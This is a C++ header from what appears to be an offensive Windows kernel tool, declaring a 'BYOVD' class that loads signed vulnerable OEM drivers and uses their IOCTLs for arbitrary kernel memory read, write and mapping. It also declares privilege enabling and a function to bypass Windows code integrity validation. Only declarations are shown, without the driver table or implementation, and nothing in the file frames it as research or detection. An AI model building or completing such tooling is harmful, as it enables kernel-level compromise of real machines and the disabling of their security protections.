#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <optional>

namespace l4g::kernel {

struct BYOVDResult {
    bool success = false;
    HANDLE driver_handle = nullptr;
    std::string driver_path;
    std::string error;
};

class BYOVD {
public:
    // Find and exploit a signed vulnerable OEM driver
    static BYOVDResult exploit_vulnerable_driver();
    
    // Known vulnerable signed drivers (Windows 11 compatible)
    struct VulnerableDriver {
        const wchar_t* name;
        const wchar_t* service_name;
        const wchar_t* device_path;
        DWORD ioctl_write;      // IOCTL for arbitrary write
        DWORD ioctl_read;       // IOCTL for arbitrary read
        DWORD ioctl_map;        // IOCTL for memory mapping
        uint64_t write_offset;  // Offset in input buffer for address
        uint64_t value_offset;  // Offset in input buffer for value
        size_t input_size;      // Input buffer size
    };
    
    static const VulnerableDriver VULNERABLE_DRIVERS[];
    static size_t VULNERABLE_COUNT;
    
    // Load vulnerable driver if not already loaded
    static bool load_driver(const VulnerableDriver& drv);
    static bool unload_driver(const VulnerableDriver& drv);
    
    // Exploit primitives
    static bool arbitrary_write(HANDLE device, const VulnerableDriver& drv, uint64_t address, uint64_t value);
    static bool arbitrary_read(HANDLE device, const VulnerableDriver& drv, uint64_t address, uint64_t& out_value);
    static bool map_memory(HANDLE device, const VulnerableDriver& drv, uint64_t user_addr, uint64_t kernel_addr, size_t size);
    
    // Bypass CiValidateImageHeader
    static bool bypass_ci_validation(HANDLE device, const VulnerableDriver& drv);
    
private:
    static bool is_driver_loaded(const wchar_t* service_name);
    static bool enable_privilege(const wchar_t* privilege);
};

} // namespace l4g::kernel